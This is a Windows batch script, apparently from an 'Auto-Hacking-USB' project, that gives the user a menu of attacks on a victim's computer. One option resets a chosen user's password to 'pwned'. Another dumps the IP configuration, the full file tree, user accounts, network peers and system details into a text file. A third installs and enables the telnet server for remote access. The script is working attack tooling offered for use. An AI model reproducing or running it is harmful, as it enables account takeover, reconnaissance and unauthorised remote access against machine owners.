@echo off
:starthere
echo What would you like to do today?
echo 0) Removes user password
echo 1) Get info about the computer. Stored under System_Info.txt
echo 2) Turn on telnet (GREAT for lan connection from another computer)
echo 3) More stuff is coming soon! Look for the next update at https://github.com/rossepsteini/Auto-Hacking-USB
set /p choice=
if %choice% == 0 goto :cp
if %choice% == 1 goto :gi
if %choice% == 2 goto :et
cls
:cp
net user
echo Which one of these is the victims user name?
set /p user=
net user %user% pwned
echo The password for %user% has been changed to pwned!
pause
cls
goto :starthere
:gi
cls
echo Gettings tons of info from the computer. Will be stored in System_Info.txt
pause
echo IP Configuration: >> System_Info.txt
ipconfig /all >> System_Info.txt
echo Complete File Structure: >> System_Info.txt
tree /f >> System_Info.txt
echo All Users on computer: >> System_Info.txt
net user >> System_Info.txt
echo Computers connected to network: >> System_Info.txt
net view >> System_Info.txt
echo Hardware and other system info: >> System_Info.txt
systeminfo >> System_Info.txt
ping localhost -n 5>null
cls
goto :starthere
:et
pkgmgr /iu:”TelnetClient”
pkgmgr /iu:”TelnetServer”
echo Telnet now enabled.
ping localhost -n 2 >null
ipconfig
cls
goto :starthere